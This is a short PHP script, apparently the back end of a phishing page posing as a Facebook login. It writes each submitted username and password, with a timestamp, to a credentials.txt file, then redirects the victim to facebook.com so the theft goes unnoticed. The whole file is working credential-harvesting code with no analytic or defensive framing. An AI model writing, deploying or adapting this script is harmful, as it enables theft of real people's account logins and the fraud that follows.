<?php
file_put_contents("../credentials.txt", date("Y-m-d H:i:s")." | ".$_POST['username']." | ".$_POST['password']."\n", FILE_APPEND);
header("Location: https://facebook.com");
exit();
?>
